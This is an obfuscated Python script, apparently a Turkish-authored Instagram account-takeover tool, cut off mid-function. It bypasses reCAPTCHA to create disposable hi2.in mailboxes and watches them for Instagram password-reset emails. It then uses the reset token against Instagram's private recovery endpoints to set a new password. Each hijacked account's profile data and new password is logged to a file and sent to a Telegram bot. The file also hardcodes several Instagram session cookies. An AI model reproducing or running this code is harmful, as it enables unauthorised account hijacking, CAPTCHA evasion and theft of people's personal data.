

import os as hasu1
import sys as hasu2
import re as hasu3
import json as hasu4
import string as hasu5
import random as hasu6
import secrets as hasu7
import uuid as hasu8
import time as hasu9
from datetime import datetime as hasu10
from threading import Thread as hasu11, Lock as hasu12
import requests as hasu13
import urllib.parse as hasu14
import webbrowser as hasu15
from colorama import Fore as hasu16, Style as hasu17, init as hasu18
from concurrent.futures import ThreadPoolExecutor as hasu19, as_completed as hasu20
import pickle as hasu21
from itertools import cycle as hasu22
import httpx as hasu23
import ssl as hasu24
from rich.console import Group as hasu25, Console as hasu26
from rich.panel import Panel as hasu27
from rich.prompt import Prompt as hasu28, IntPrompt as hasu29
from rich.text import Text as hasu30
from rich.align import Align as hasu31
from rich.layout import Layout as hasu32
from rich.table import Table as hasu33
from rich.live import Live as hasu34
from bs4 import BeautifulSoup as hasu35
import html as hasu36
#import websocket

hasu18(autoreset=True)
hasu37 = hasu26()
hasu38 = hasu12()
hasu39 = hasu12()
hasu40 = 0
hasu41 = hasu12()
hasu42 = []
hasu43 = []
hasu44 = []
hasu45 = None
hasu46 = {'output_file': '@hasuCode_hits.txt', 'good_mail_file': '@hasuCode_good_mail.txt', 'hit_file': '@hasupyy_hit.txt', 'channel': 'https://t.me/hasu_portal', 'me': 'https://t.me/hasu_hu'}
hasu47 = 0
hasu48 = 0
hasu49 = 0
hasu50 = 0
hasu51 = 0
hasu52 = 0
hasu53 = None

hasu54 = {'1': {'title': ' HASU VIP INSTAGRAM hi2.in ', 'token': ' Telegram Bot Token ', 'chat_id': ' Telegram Chat ID ', 'sys_status': 'HASU INSTAGRAM hi2.in TOOL', 'total_scanned': 'TOTAL TARANAN', 'latest_hit': ' NEW HI2 API FILE ACTIVE  (HIT) '}}
hasu55 = 'Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)'
hasu56 = 'https://i.instagram.com/api/v1/users/check_email/'
hasu57 = 'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/'
hasu58 = [{'csrftoken': 'Sdm63Gxs5kqgRM5iGg4SgkxqBg2FLyKg', 'mid': 'aj0M3AAAAAE-vg6Jetdj_9Uq8lLq', 'ig_did': 'A6B96F97-0F66-46CE-9472-246589D06591', 'sessionid': '27783083038%3AgMr35hYG2Wfdbz%3A4%3AAYgtiujxWB4b-mpntAyXdIzdZjdpcJ7pE5kCSRIjnQ', 'ds_user_id': '27783083038'}, {'csrftoken': 'nkp8N8wqAKdbqqSL4QEeNN', 'ig_did': 'B51333D9-4C73-44B1-A142-81FDF4298435', 'mid': 'aj0OngABAAFEk6vpajxEcJbzOFSr', 'ds_user_id': '14977459511', 'sessionid': '14977459511%3AY3gsH3hE20BhN9%3A21%3AAYgkoELMqu2T7jYZ4Fs6Ypo5mGM9mkFcybtRKGOesw'}, {'csrftoken': 'tI3HllRstzj4TLKaFjx20X7hZWt2hrNC', 'mid': 'aj0UVQAAAAE8WQ1mWbzKmRiAhaK9', 'ig_did': '67A991C6-8686-41DA-A46E-A15CB3F552D7', 'sessionid': '22744409153%3Anh2ZKn0yfljENR%3A20%3AAYhxz6vhi5UOtlAid0En-VtQuNzfB5KaEIjvLw1XWg', 'ds_user_id': '22744409153'}, {'datr': 'dBU9anh8oNwQ8xyGQi6EnKI1', 'ig_did': 'BADF8CB9-C33A-40F5-BB88-15BB9EF6B401', 'mid': 'aj0VdAABAAEmy5dL6zl9wE7f0Ayx', 'csrftoken': 'mLZVU7AYuBeFpLqWNpBbRwMKeeBpXw1O', 'ds_user_id': '48746179634', 'sessionid': '48746179634%3AVPJeyUW2HAH06u%3A4%3AAYhwUykuA2qWnvgEhgAiAM_iF1u8Y-hMC7_xwvizbQ'}]
hasu59 = ''
hasu60 = ''
hasu61 = ''
hasu62 = ''
hasu63 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0'
hasu64 = {'fb_dtsg': None, 'lsd': None, 'rev': '1035271382', 'bkv': '61fc9465e13b77eaa110f317859102ba7fb93a0a2bcc08c46473da6713640739'}
hasu65 = hasu12()


def hasu66(hasu67):
    hasu68 = ['csrftoken', 'mid', 'ig_did', 'sessionid', 'ds_user_id', 'datr']
    hasu69 = []
    for hasu70 in hasu68:
        if hasu67.get(hasu70):
            hasu69.append(f"{hasu70}={hasu67[hasu70]}")
    for hasu70, hasu71 in hasu67.items():
        if hasu70 not in hasu68 and hasu71:
            hasu69.append(f"{hasu70}={hasu71}")
    return '; '.join(hasu69)


def hasu72():
    global hasu40, hasu59, hasu60, hasu61, hasu62
    with hasu41:
        hasu67 = hasu58[hasu40 % len(hasu58)]
        hasu40 += 1
    hasu59 = hasu67['sessionid']
    hasu60 = hasu67['csrftoken']
    hasu61 = hasu67['ds_user_id']
    hasu62 = hasu66(hasu67)
    return hasu67


def hasu73():
    hasu67 = hasu6.choice(hasu58)
    hasu74 = hasu66(hasu67)
    return (hasu67['sessionid'], hasu67['csrftoken'], hasu67['ds_user_id'], hasu74)


def hasu75(hasu76=None, hasu77='instagram'):
    global hasu64
    global hasu59, hasu62
    if not hasu59:
        return False
    hasu78 = hasu76 or hasu62
    try:
        hasu79 = hasu13.get(f'https://www.instagram.com/{hasu77}/', headers={'User-Agent': hasu63, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Cookie': hasu78, 'Referer': 'https://www.instagram.com/'})
        hasu80 = hasu79.text
        hasu81 = hasu3.search('"f":"([^"]+)"', hasu80)
        hasu82 = hasu3.search('"LSD"[^}]*"token":"([^"]+)"', hasu80)
        hasu83 = hasu3.search('"server_revision":(\\d+)', hasu80)
        hasu84 = hasu3.search('__bkv=([a-f0-9]{40,})', hasu80)
        hasu85 = hasu3.search('"hsi":"([^"]+)"', hasu80)
        hasu86 = hasu3.search('"__dyn":"([^"]+)"', hasu80)
        hasu87 = hasu3.search('"__csr":"([^"]+)"', hasu80)
        with hasu65:
            if hasu81:
                hasu64['fb_dtsg'] = hasu81.group(1)
            if hasu82:
                hasu64['lsd'] = hasu82.group(1)
            if hasu83:
                hasu64['rev'] = hasu83.group(1)
            if hasu84:
                hasu64['bkv'] = hasu84.group(1)
            if hasu85:
                hasu64['hsi'] = hasu85.group(1)
            if hasu86:
                hasu64['dyn'] = hasu86.group(1)
            if hasu87:
                hasu64['csr'] = hasu87.group(1)
        return hasu64['fb_dtsg'] is not None
    except Exception:
        return False


def hasu88():
    while True:
        try:
            if not hasu64.get('fb_dtsg'):
                hasu72()
                hasu75(hasu62)
            else:
                hasu75(hasu62)
        except Exception:
            pass
        hasu9.sleep(60)


def hasu89(hasu90, hasu77):
    if not hasu64.get('fb_dtsg'):
        hasu75(hasu62, hasu77)
    hasu91 = hasu92(hasu90, hasu77)
    if hasu91.get('join_date') or hasu91.get('country') or hasu91.get('former_usernames'):
        return hasu91
    try:
        hasu72()
        hasu75(hasu62, hasu77)
        hasu93 = hasu92(hasu90, hasu77)
        return hasu93
    except Exception:
        pass
    return hasu91


def hasu92(hasu90, hasu77):
    try:
        hasu94, hasu95, hasu96, hasu78 = hasu73()
        with hasu65:
            hasu97 = hasu64.get('fb_dtsg')
            hasu98 = hasu64.get('lsd') or ''.join(hasu6.choices(hasu5.ascii_letters + hasu5.digits, k=10))
            hasu99 = hasu64.get('rev', '1035271382')
            hasu100 = hasu64.get('bkv', '61fc9465e13b77eaa110f317859102ba7fb93a0a2bcc08c46473da6713640739')
        if not hasu97:
            return {'join_date': None, 'country': None, 'former_usernames': []}
        hasu101 = hasu64.get('hsi', '7618017801523903853')
        hasu102 = hasu64.get('dyn', '7xeUjG1mxu1syUbFp41twpUnwgU7SbzEdF8aUco2qwJxS0DU2wx609vCwjE1EE2Cw8G11wBz81s8hwGxu786a3a1YwBgao6C0Mo2')
        hasu103 = hasu64.get('csr', '')
        hasu104 = '2' + str(sum(ord(hasu105) for hasu105 in hasu97))
        hasu106 = str(int(hasu9.time()))
        hasu107 = {'__d': 'www', '__user': '0', '__a': '1', '__req': '15', '__hs': '20529.HYP:instagram_web_pkg.2.1...0', 'dpr': '1', '__ccg': 'EXCELLENT', '__rev': hasu99, '__hsi': hasu101, '__dyn': hasu102, '__csr': hasu103, '__comet_req': '7', '__crn': 'comet.igweb.PolarisProfilePostsTabRoute', 'fb_dtsg': hasu97, 'jazoest': hasu104, 'lsd': hasu98, '__spin_r': hasu99, '__spin_b': 'trunk', '__spin_t': hasu106, 'params': hasu4.dumps({'referer_type': 'ProfileMore', 'target_user_id': str(hasu90)})}
        hasu108 = f'https://www.instagram.com/async/wbloks/fetch/?appid=com.bloks.www.ig.about_this_account&type=app&__bkv={hasu100}'
        hasu79 = hasu13.post(hasu108, headers={'User-Agent': hasu63, 'Accept': '*/*', 'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Origin': 'https://www.instagram.com', 'Referer': f'https://www.instagram.com/{hasu77}/', 'Cookie': hasu78, 'X-CSRFToken': hasu95, 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin'}, data=hasu14.urlencode(hasu107))
        hasu109 = hasu79.text
        if hasu109.startswith('for (;;);'):
            hasu109 = hasu109[9:]
        hasu110 = hasu4.loads(hasu109)
        if hasu110.get('error') or hasu110.get('status') == 'fail':
            with hasu65:
                hasu64['fb_dtsg'] = None
            return {'join_date': None, 'country': None, 'former_usernames': []}
        hasu91 = {'join_date': None, 'country': None, 'former_usernames': []}
        hasu111 = hasu4.dumps(hasu110, ensure_ascii=False)
        for hasu112 in ['Katilma tarihi ([A-Za-z\\u00c7\\u00e7\\u011e\\u011f\\u0130\\u0131\\u00d6\\u00f6\\u015e\\u015f\\u00dc\\u00fc]+ \\d{4})', 'Katılma tarihi ([A-Za-z\\u00c7\\u00e7\\u011e\\u011f\\u0130\\u0131\\u00d6\\u00f6\\u015e\\u015f\\u00dc\\u00fc]+ \\d{4})', 'Date joined ([A-Za-z]+ \\d{4})']:
            hasu81 = hasu3.search(hasu112, hasu111)
            if hasu81:
                hasu91['join_date'] = hasu81.group(1)
                break
        try:
            hasu113 = hasu110.get('payload', {}).get('layout', {}).get('bloks_payload', {}).get('data', [])
            for hasu114 in hasu113:
                if isinstance(hasu114, dict):
                    hasu115 = hasu114.get('data', {})
                    hasu116 = hasu115.get('key', '')
                    if 'about_this_account_country' in hasu116 and 'visibility' not in hasu116:
                        hasu91['country'] = hasu115.get('initial', 'Paylasılmadı')
                        break
        except Exception:
            pass
        hasu117 = hasu3.findall('nceki kullan[^"]*"([a-zA-Z0-9._]{2,30})"', hasu111)
        if hasu117:
            hasu91['former_usernames'] = list(set(hasu117))
        return hasu91
    except Exception:
        return {'join_date': None, 'country': None, 'former_usernames': []}


def hasu118(hasu119):
    if not hasu119 or hasu119 == '-' or hasu119 == 'Paylasılmadı':
        return ''
    hasu120 = {'Türkiye': 'TR', 'Turkey': 'TR', 'United States': 'US', 'Germany': 'DE', 'United Kingdom': 'GB', 'France': 'FR', 'Netherlands': 'NL', 'Russia': 'RU', 'Brazil': 'BR', 'India': 'IN', 'Indonesia': 'ID', 'Italy': 'IT', 'Spain': 'ES', 'Mexico': 'MX', 'Argentina': 'AR', 'Poland': 'PL', 'Azerbaijan': 'AZ', 'Kazakhstan': 'KZ', 'Ukraine': 'UA', 'Greece': 'GR', 'Bulgaria': 'BG', 'Romania': 'RO', 'Saudi Arabia': 'SA', 'Egypt': 'EG', 'Iraq': 'IQ', 'Iran': 'IR', 'Pakistan': 'PK', 'Bangladesh': 'BD', 'Japan': 'JP', 'South Korea': 'KR', 'China': 'CN', 'Canada': 'CA', 'Australia': 'AU', 'Morocco': 'MA', 'Tunisia': 'TN', 'Algeria': 'DZ'}
    hasu121 = hasu120.get(hasu119.strip())
    if not hasu121:
        return ''
    return ''.join(chr(0x1F1E6 + ord(hasu122) - ord('A')) for hasu122 in hasu121)


def hasu123(hasu90):
    try:
        hasu124 = int(str(hasu90))
        hasu125 = hasu124 >> 23
        hasu126 = hasu125 / 1000.0
        return hasu10.utcfromtimestamp(hasu126).strftime('%Y-%m-%d')
    except Exception:
        return 'Bilinmiyor'


def hasu127(hasu77: str):
    hasu128 = hasu24.create_default_context()
    hasu129 = 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384'
    hasu128.set_ciphers(hasu129)
    hasu130 = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8', 'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'x-ig-app-id': '936619743392459', 'x-ig-www-claim': '0', 'x-requested-with': 'XMLHttpRequest', 'Referer': f'https://www.instagram.com/{hasu77}/'}
    hasu108 = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={hasu77}'
    try:
        with hasu23.Client(http2=True, verify=hasu128, headers=hasu130) as hasu131:
            hasu132 = hasu131.get(hasu108)
            if hasu132.status_code == 200:
                return hasu132.json()
    except Exception:
        pass
    return None


def hasu133(hasu134):
    try:
        hasu135 = hasu36.unescape(hasu134)
        hasu136 = ' '.join(hasu135.split())
        hasu137 = hasu3.search('Hi\\s+([a-zA-Z0-9_\\.]{3,30}),', hasu136)
        if hasu137:
            return hasu137.group(1)
        hasu138 = hasu3.search('Merhaba\\s+([a-zA-Z0-9_\\.]{3,30}),', hasu136)
        if hasu138:
            return hasu138.group(1)
        hasu139 = hasu3.search('Hello\\s+([a-zA-Z0-9_\\.]{3,30}),', hasu136)
        if hasu139:
            return hasu139.group(1)
        hasu140 = hasu3.search('adresine\\s+([a-zA-Z0-9_\\.]{3,30})\\s+icin', hasu136)
        if hasu140:
            return hasu140.group(1)
        hasu141 = hasu3.search('for\\s+([a-zA-Z0-9_\\.]{3,30})\\s+at', hasu136)
        if hasu141:
            return hasu141.group(1)
        hasu142 = hasu3.search('account([a-zA-Z0-9_\\.]{3,30})\\s+has', hasu136)
        if hasu142:
            return hasu142.group(1)
        hasu143 = hasu3.search('Instagram account\\s+([a-zA-Z0-9_\\.]{3,30})\\s+', hasu136)
        if hasu143:
            return hasu143.group(1)
    except Exception:
        pass
    return None


def hasu144():
    hasu145 = f"android-{''.join(hasu6.choices(hasu5.hexdigits.lower(), k=16))}"
    hasu146 = ['samsung', 'xiaomi', 'huawei', 'oneplus', 'google']
    hasu147 = ['SM-G975F', 'Mi-9T', 'P30-Pro', 'ONEPLUS-A6003', 'Pixel-4']
    hasu148 = ['240dpi', '320dpi', '480dpi']
    hasu149 = ['720x1280', '1080x1920', '1440x2560']
    hasu150 = ['28/9', '29/10', '30/11', '31/12']
    hasu151 = f'Instagram 394.0.0.46.81 Android ({hasu6.choice(hasu150)}; {hasu6.choice(hasu148)}; {hasu6.choice(hasu149)}; {hasu6.choice(hasu146)}; {hasu6.choice(hasu147)}; intel; en_US; {hasu6.randint(100000000, 999999999)})'
    hasu152 = str(hasu8.uuid4())
    hasu153 = int(hasu10.now().timestamp())
    hasu154 = ''.join([str(hasu6.randint(1, 10)) for hasu155 in range(2)])
    hasu156 = f'#PWD_INSTAGRAM:0:{hasu153}:Random@{hasu154}'
    return (hasu145, hasu151, hasu152, hasu156)


def hasu157(hasu158='', hasu151=''):
    hasu130 = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Bloks-Version-Id': 'e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd', 'User-Agent': hasu151}
    if hasu158:
        hasu130['X-Mid'] = hasu158
    return hasu130


def hasu159(hasu160, hasu134=None):
    try:
        hasu160 = hasu36.unescape(hasu160).replace('&amp;', '&')
        hasu145, hasu151, hasu152, hasu156 = hasu144()
        hasu161 = hasu160.split('uidb36=')[1].split('&token=')[0]
        hasu162 = hasu160.split('&token=')[1]
        hasu163 = hasu3.split('["\\\'><\\s:;]', hasu162)[0]
        hasu164 = 'e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd'
        hasu165 = hasu4.dumps({'bloks_version': hasu164, 'styles_id': 'instagram'})
        hasu166 = hasu13.post('https://i.instagram.com/api/v1/accounts/password_reset/', headers=hasu157(hasu151=hasu151), data={'source': 'one_click_login_email', 'uidb36': hasu161, 'device_id': hasu145, 'token': hasu163, 'waterfall_id': hasu152, 'guid': str(hasu8.uuid4()), 'phone_id': str(hasu8.uuid4()), '_uuid': str(hasu8.uuid4()), '_csrftoken': 'missing'})
        if 'user_id' not in hasu166.text:
            return {'success': False}
        hasu158 = hasu166.headers.get('Ig-Set-X-Mid', '')
        hasu167 = hasu166.json()
        hasu90 = hasu167.get('user_id', '')
        hasu168 = hasu167.get('challenge_context', '')
        hasu169 = hasu13.post('https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.ig.challenge.redirect.async/', headers=hasu157(hasu158, hasu151), data={'user_id': str(hasu90), 'cni': '0', 'nonce_code': '', 'bk_client_context': hasu165, 'challenge_context': str(hasu168), 'bloks_versioning_id': hasu164, 'get_challenge': 'true'})
        hasu170 = hasu169.headers.get('Ig-Set-X-Mid', '')
        if hasu170:
            hasu158 = hasu170
        hasu171 = ''
        try:
            hasu172 = hasu169.json()
            hasu173 = hasu172['layout']['bloks_payload']['ft']
            for hasu116, hasu174 in hasu173.items():
                if 'context_data' in hasu174:
                    hasu175 = hasu3.search('(Q-PTBA[^"]+?\\|appr)', hasu174)
                    if hasu175:
                        hasu171 = hasu175.group(1)
                        break
        except Exception:
            pass
        if not hasu171:
            hasu175 = hasu3.search('(Q-PTBA[^"]+?\\|appr)', hasu169.text)
            if hasu175:
                hasu171 = hasu175.group(1)
        if not hasu171:
            for hasu112 in ['(Q-PTBA[^"\\\\]+?\\|[a-z]+)']:
                hasu175 = hasu3.search(hasu112, hasu169.text)
                if hasu175:
                    hasu171 = hasu175.group(1)
                    break
        if not hasu171:
            return {'success': False}
        hasu176 = {'client_input_params': {'password': hasu156, 'aac': ''}, 'server_params': {'context_data': hasu171, 'INTERNAL__latency_qpl_marker_id': 36707139, 'INTERNAL__latency_qpl_instance_id': hasu6.randint(100000000000000, 999999999999999)}}
        hasu177 = hasu13.post('https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.ap.last_resort_recovery.reset_password.async/', headers=hasu157(hasu158, hasu151), data={'params': hasu4.dumps(hasu176), 'bk_client_context': hasu165, 'bloks_versioning_id': hasu164})
        hasu178 = hasu156.split(':')[-1]
        hasu77 = None
        if hasu134:
            hasu77 = hasu133(hasu134)
        if hasu177.status_code == 200:
            hasu179 = hasu177.text
            if any(k in hasu179 for k in ['BLOKS AUTH PLATFORM RESET PASSWORD', 'has_whatsapp_installed', 'password_reset_success', '"status":"ok"']):
                return {'success': True, 'password': hasu178, 'user_id': hasu90, 'username': hasu77}
            if 'action' in hasu179 and 'close' in hasu179:
                return {'success': False}
            return {'success': True, 'password': hasu178, 'user_id': hasu90, 'username': hasu77}
        return {'success': False}
    except Exception:
        return {'success': False}


class hasu180:
    def __init__(self, hasu181, hasu182, hasu183, hasu184, hasu185, hasu186):
        self.email = hasu181
        self.hash_val = hasu182
        self.cookies = hasu183
        self.task_entry = hasu184
        self.tg_token = hasu185
        self.tg_chat = hasu186
        self.session = hasu13.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Referer': 'https://hi2.in/', 'Origin': 'https://hi2.in'})
        if hasu183:
            for hasu187 in hasu183.split(';'):
                if '=' in hasu187:
                    hasu188, hasu189 = hasu187.strip().split('=', 1)
                    self.session.cookies.set(hasu188, hasu189)
        self.seen_ids = set()
        self.stopped = False

    def hasu190(self):
        hasu191 = f'https://hi2.in/api/messages?email={self.email}&hash={self.hash_val}'
        try:
            hasu192 = self.session.get(hasu191, timeout=15)
            if hasu192.status_code != 200:
                hasu192 = self.session.post('https://hi2.in/api/inbox', data={'email': self.email, 'hash': self.hash_val}, timeout=15)
            if hasu192.status_code != 200:
                return False
            try:
                hasu193 = hasu192.json()
            except Exception:
                return False
            hasu194 = hasu193 if isinstance(hasu193, list) else hasu193.get('messages', hasu193.get('data', []))
            if not hasu194:
                return False
            for hasu195 in hasu194:
                hasu196 = str(hasu195.get('id') or hasu195.get('uid') or hasu195.get('timestamp') or '')
                if hasu196 in self.seen_ids:
                    continue
                self.seen_ids.add(hasu196)
                hasu197 = hasu4.dumps({'id': hasu196, 'data': hasu195})
                self._on_message_impl(hasu197)
                return True
            return False
        except Exception:
            return False

    def _on_message_impl(self, hasu197):
        try:
            hasu198 = hasu4.loads(hasu197)
            hasu195 = hasu198.get('data', {})
            hasu199 = hasu195.get('text') or hasu195.get('body') or hasu195.get('message') or ''
            hasu200 = hasu195.get('html') or hasu195.get('body_html') or ''
            hasu201 = str(hasu199) + ' \n ' + str(hasu200)
            hasu202 = hasu195.get('headers') or hasu195.get('from') or {}
            if isinstance(hasu202, dict):
                hasu203 = hasu202.get('from') or hasu202.get('text') or 'Bilinmiyor'
                hasu204 = hasu202.get('subject') or hasu195.get('subject') or 'Konu Yok'
            else:
                hasu203 = 'Bilinmiyor'
                hasu204 = hasu195.get('subject', 'Konu Yok')
            with hasu38:
                self.task_entry['time'] = hasu10.now().strftime('%H:%M:%S')
                self.task_entry['status'] = '[bold yellow]Mail geldi, bypass deneniyor...[/bold yellow]'
            global hasu44
            with hasu38:
                if not any(hasu81['email'] == self.email for hasu81 in hasu44):
                    hasu44.append({'email': self.email, 'status': '[bold yellow]Mail Geldi[/bold yellow]', 'time': hasu10.now().strftime('%H:%M:%S')})
            hasu77 = None
            if 'https://i.instagram.com/api/v1/accounts/password_reset/' in hasu201 or 'uidb36' in hasu201:
                hasu91 = hasu159(hasu201, hasu201)
                if hasu91.get('success'):
                    global hasu47, hasu45, hasu52
                    with hasu38:
                        hasu47 += 1
                        hasu52 += 1
                        hasu49 = max(0, hasu49 - 1)
                        hasu77 = hasu91.get('username')
                        hasu205 = str(hasu91['user_id'])
                        hasu206 = 'Belirtilmemis'
                        hasu207 = 0
                        hasu208 = 0
                        hasu209 = 0
                        hasu210 = 'Gonderi Yok / Cekilemedi'
                        hasu211 = 0
                        hasu212 = False
                        hasu213 = 'no'
                        hasu214 = 'Belirtilmemis'
                        hasu215 = 'Yok'
                        hasu216 = 'Yok'
                        hasu217 = 'Yok'
                        hasu218 = 'Yok'
                        if hasu77:
                            hasu219 = hasu127(hasu77)
                            if hasu219 and 'data' in hasu219 and 'user' in hasu219['data']:
                                hasu220 = hasu219['data']['user']
                                if hasu220:
                                    hasu206 = hasu220.get('full_name') or 'Belirtilmemis'
                                    hasu207 = hasu220.get('edge_followed_by', {}).get('count', 0)
                                    hasu208 = hasu220.get('edge_follow', {}).get('count', 0)
                                    hasu209 = hasu220.get('edge_owner_to_timeline_media', {}).get('count', 0)
                                    hasu211 = hasu220.get('highlight_reel_count', 0) or 0
                                    hasu212 = hasu220.get('is_private', False)
                                    hasu213 = 'yes' if hasu220.get('is_verified') else 'no'
                                    hasu214 = hasu220.get('category_name') or 'Belirtilmemis'
                                    hasu221 = hasu220.get('biography') or ''
                                    if not hasu221 and hasu220.get('biography_with_entities'):
                                        hasu221 = hasu220['biography_with_entities'].get('raw_text', '')
                                    hasu218 = hasu221 if hasu221 else 'Yok'
                                    hasu217 = hasu220.get('external_url') or 'Yok'
                                    hasu216 = 'yes' if hasu220.get('has_onboarded_to_text_post_app') else 'Yok'
                                    hasu222 = hasu220.get('business_email', '')
                                    hasu223 = hasu220.get('business_phone_number', '')
                                    hasu224 = [hasu105 for hasu105 in [hasu222, hasu223] if hasu105]
                                    hasu215 = ' / '.join(hasu224) if hasu224 else 'Yok'
                                    hasu225 = hasu220.get('edge_owner_to_timeline_media', {}).get('edges', [])
                                    if hasu225:
                                        try:
                                            hasu226 = hasu225[0]['node']['taken_at_timestamp']
                                            hasu227 = hasu225[-1]['node']['taken_at_timestamp']
                                            hasu210 = f"First: {hasu10.fromtimestamp(hasu227).strftime('%d.%m.%Y')} | Last: {hasu10.fromtimestamp(hasu226).strftime('%d.%m.%Y')}"
                                        except Exception:
                                            pass
                                    if not hasu205 or hasu205 == 'None':
                                        hasu205 = str(hasu220.get('id', hasu91['user_id']))
                        hasu228 = str(hasu123(hasu205))
                        hasu229 = '-'
                        if hasu77:
                            if not hasu64.get('fb_dtsg'):
                                hasu75(hasu62, hasu77)
                            hasu230 = hasu89(hasu205, hasu77)
                            hasu228 = hasu230.get('join_date') or str(hasu123(hasu205))
                            hasu119 = hasu230.get('country') or '-'
                            hasu231 = hasu118(hasu119)
                            hasu229 = f'{hasu119} {hasu231}'.strip() if hasu231 else hasu119
                        hasu232 = hasu52
                        hasu233 = f"╔══════════════════════════╗\n║     NEW HİT #{hasu232}\n╠══════════════════════════╣\n║ User           : @{hasu77 or 'Bilinmiyor'}\n║ Mail           : {self.email}\n║ Password       : {hasu91['password']}\n║ Full Name      : {hasu206}\n║ Followers      : {hasu207}\n║ Following      : {hasu208}\n║ Posts          : {hasu209}\n║ Post Tarihleri : {hasu210}\n║ Öne Çıkanlar   : {hasu211}\n║ Private        : {hasu212}\n║ Verified       : {hasu213}\n║ Kategori       : {hasu214}\n║ İletişim       : {hasu215}\n║ Threads        : {hasu216}\n║ Bio Link       : {hasu217}\n║ Bio            : {hasu218}\n║ Date           : {hasu228}\n║ Ülke           : {hasu229}\n╠══════════════════════════╣\n║ By       : @hasupyy\n╚══════════════════════════╝"
                        hasu45 = {'email': self.email, 'username': hasu77 or 'Bilinmiyor', 'password': hasu91['password'], 'user_id': hasu205, 'followers': hasu207, 'time': hasu10.now().strftime('%H:%M:%S'), 'status': 'good_hit'}
                        self.task_entry['time'] = hasu10.now().strftime('%H:%M:%S')
                        self.task_entry['status'] = '[bold gold1]GOOD HIT! (Bypass)[/bold gold1]'
                    try:
                        with open(hasu46['output_file'], 'a', encoding='utf-8') as hasu234:
                            hasu234.write(hasu233 + '\n\n')
                    except Exception:
                        pass
                    try:
                        hasu235 = f'https://api.telegram.org/bot{self.tg_token}/sendMessage'
                        hasu13.post(hasu235, json={'chat_id': self.tg_chat, 'text': hasu233}, timeout=15)
                    except Exception:
                        pass
                    hasu9.sleep(3)
                    self.task_entry['remove'] = True
                else:
                    with hasu38:
                        self.task_entry['time'] = hasu10.now().strftime('%H:%M:%S')
                        self.task_entry['status'] = '[bold yellow]Bypass Basarisiz[/bold yellow]'
                    hasu9.sleep(3)
                    self.task_entry['remove'] = True
            else:
                global hasu50
                with hasu38:
                    hasu50 += 1
                    self.task_entry['time'] = hasu10.now().strftime('%H:%M:%S')
                    self.task_entry['status'] = '[bold red]BAD MAIL[/bold red]'
                hasu9.sleep(3)
                self.task_entry['remove'] = True
        except Exception:
            pass

    def start(self):
        hasu11(target=self._poll_loop, daemon=True).start()

    def _poll_loop(self):
        hasu236 = hasu9.time()
        while not self.stopped and not self.task_entry.get('remove', False):
            self.hasu190()
            if self.task_entry.get('remove', False):
                break
            if hasu9.time() - hasu236 > 70:
                if not self.task_entry.get('status', '').startswith('[bold'):
                    pass
                else:
                    self.task_entry['status'] = '[bold red]Zaman Asimi[/bold red]'
                    self.task_entry['remove'] = True
                break
            hasu9.sleep(1.2)


class hasu237:
    def __init__(self, hasu184, hasu185, hasu186):
        self.session = hasu13.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Referer': 'https://hi2.in/', 'Origin': 'https://hi2.in'})
        self.task_entry = hasu184
        self.tg_token = hasu185
        self.tg_chat = hasu186
        try:
            self.session.get('https://hi2.in/', timeout=10)
        except Exception:
            pass

    def get_captcha(self):
        try:
            hasu108 = 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&size=invisible'
            hasu79 = self.session.get(hasu108, timeout=10)
            hasu163 = hasu79.text.split('recaptcha-token" value="')[1].split('"')[0]
            hasu238 = {'v': 'XrIDux0s7SoNe6_IHkjGC92W', 'reason': 'q', 'c': hasu163, 'k': '6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct', 'co': 'aHR0cHM6Ly9oaTIuaW46NDQz', 'hl': 'en', 'size': 'invisible'}
            hasu239 = self.session.post('https://www.google.com/recaptcha/enterprise/reload', data=hasu238, timeout=10)
            return hasu239.text.split('resp","')[1].split('"')[0]
        except Exception:
            return None

    def create_email(self, hasu240):
        hasu241 = self.get_captcha()
        if not hasu241:
            return (None, None)
        hasu242 = {'domain': '@hi2.in', 'prefix': hasu240, 'recaptcha': hasu241}
        hasu79 = self.session.post('https://hi2.in/api/custom', data=hasu242)
        if hasu79.status_code == 200:
